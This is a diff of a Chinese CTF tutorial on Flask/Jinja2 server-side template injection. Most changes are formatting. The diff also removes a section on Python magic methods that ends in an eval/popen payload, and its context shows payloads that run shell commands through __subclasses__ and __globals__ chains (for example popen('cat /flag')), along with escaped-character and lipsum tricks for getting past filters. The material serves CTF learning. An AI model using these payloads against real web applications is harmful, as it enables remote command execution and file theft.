@@ -1,9 +1,9 @@
-```
-title: SSTI模版注入
-date: 2024-08-24 13:59:56
+---
+title: SSTI模板注入
+date: 2024-8-15 17:34:02
 tags: CTF
-categories: CTF-WEB
-```
+categories: CTF-Web
+---
 
 #  1.Python venv
 
@@ -19,11 +19,11 @@ categories: CTF-WEB
 
 方法2： cd flask1
 
-​				scorce ./bin/acticate  
+scorce ./bin/acticate  
 
-​				进入该虚拟环境
+进入该虚拟环境
 
-​				deactivate退出虚拟环境
+deactivate退出虚拟环境
 
 # 2.Flask
 
@@ -83,52 +83,8 @@ render_template_string:用于渲染字符串，直接定义内容
 
 这幅图的含义是通过这些指令去判断对方用的是什么模板，下面解释一下这幅图的意思:
 绿色箭头是执行成功，红色箭头是执行失败。
-首先是注入${7\*7}没有回显出49的情况，这种时候就是执行失败走红线，再次注入{{7\*7}}如果还是没有回显49就代表这里没有模板注入；如果注入{{7＊7}}回显了49代表执行成功，继续往下走注入{{7\*7}}，如果执行成功回显7777777说明是jinja2模板，如果回显是49就说明是Twig模板。
+首先是注入${7\*7}没有回显出49的情况，这种时候就是执行失败走红线，再次注入`{{7*7}}`如果还是没有回显49就代表这里没有模板注入；如果注入`{{7＊7}}`回显了49代表执行成功，继续往下走注入`{{7*7}}`，如果执行成功回显7777777说明是jinja2模板，如果回显是49就说明是Twig模板。
 然后回到最初注入${7＊7}成功回显出49的情况，这种时候是执行成功走绿线，再次注入a{*comment*}b，如果执行成功回显ab，就说明是Smarty模板；如果没有回显出ab，就是执行失败走红线，注入${"z".join("ab")}，如果执行成功回显出zab就说明是Mako模板。实际做题时也可以把指令都拿去测测看谁能对上。平时做题也可以多搜集不同模板对应的注入语句语法。
-
-## 继承关系
-
-```python
-class A:pass
-class B(A):pass
-class C(B):pass
-class D(B):pass
-c=C()
-print(c.__class__) #<class '__main__.C'>
-print(c.__class__.__base__) #<class '__main__.B'>
-print(c.__class__.base__.__base__) #<class '__main__.A'>
-print(c.__class__.__mro__) #(<class '__main__.C'>, <class '__main__.B'>, <class '__main__.A'>, <class 'object'>)
-print(c.__class__.__base__.__subclasses__()) #[<class '__main__.C'>, <class '__main__.D'>]
-print(c.__class__.__base__.__subclasses__()[1])#<class '__main__.D'>
-```
-
-## 魔术方法
-
-_\_class__:查看当前类型的所属对象
-
-_\_base__:查看当前对象的父类
-
-_\_mro__::查看当前对象的所有父类
-
-_\_subclassses__()：查看当前父类下的所有子类
-
-_\_subclassses__()[1]：查看当前父类下的第二个子类，0表示第一个
-
-_\_init__:查看是否重载，重载是指程序在运行时就已经加载好了这个模块到内存中，如果出现wrapper字眼，说明没有重载
-
-_\_globals__:返回当前对象的全部全局变量，查看可以使用的函数
-
-_\_builtins__:提供对Python的所有内置标识符的直接访问
-
-eval()计算字符串表达式的值
-
-popen()：执行一个shell以运行命令来开启一个进程
-
-```python
-"".__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")
-```
-
-117是os._wrap_close
 
 # 4.SSTI常用注入模板利用
 
@@ -236,8 +192,6 @@ for i in range(500):
     except:
         pass
 ```
-
-
 
 #### 可以加载第三方库，使用load_module加载os
 
@@ -400,15 +354,15 @@ __getitem__()=[]
 
 ## 1.request.args.cmd配合get提交
 
-![image-20240513162251340](SSTI/image-20240513162251340.png)
+![image-20240513162251340](SSTI/image-20240513162251340-1726391806557.png)
 
 ## 2.request.form.cmd配合from提交
 
-![image-20240513161046099](SSTI/image-20240513161046099.png)
+![image-20240513161046099](SSTI/image-20240513161046099-1726391806557.png)
 
 ## 3.request.cookies.cmd配合cookie
 
-![image-20240513162359073](SSTI/image-20240513162359073.png)
+![image-20240513162359073](SSTI/image-20240513162359073-1726391806557.png)
 
 ## 4.字符串拼接绕过
 
@@ -441,7 +395,7 @@ attr()函数
 {{''.__class__.__base__.__subclasses__()[117].__init__.__globals__["popen"]('cat /flag').read()}}
 ```
 
-![image-20240513212013589](SSTI/image-20240513212013589.png)
+![image-20240513212013589](SSTI/image-20240513212013589-1726391806558.png)
 
 ```
 http://192.168.204.149:18080/flasklab/level/6?class=__class__&base=__base__&sub=__subclasses__&geti=__getitem__&init=__init__&globals=__globals__
@@ -491,7 +445,7 @@ url={%print(()|attr(%22\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f%22
 {{()[“\x5f\x5fclass\x5f\x5f”][“\x5f\x5finit\x5f\x5f”][“\x5f\x5fglobals\x5f\x5f”][“os”].popen(“ls”).read()}}
 ```
 
-这条payload等效于{{“”.__class__.__init__.globals__.os.popen(“ls”).read()}}
+这条payload等效于`{{“”.__class__.__init__.globals__.os.popen(“ls”).read()}}`
 
 ### base64编码绕过
 
@@ -706,7 +660,7 @@ join会把字典（dict）里的键名都拼接起来，至于键的值是什么
 
 ## 实例解析2——WAF过滤’，”,_，0-9,\,.,[],空格
 
-注入{{lipsum|string|list}}，如果回显的列表里第9位是空格，第18位是下划线，就可以这样获取下划线：
+注入`{{lipsum|string|list}}`，如果回显的列表里第9位是空格，第18位是下划线，就可以这样获取下划线：
 
 ```
 {%set a=(lipsum|string|list)[18]%}{{a}}
@@ -758,5 +712,4 @@ Payload原型
 
 {{flag}}
 ```
-
 
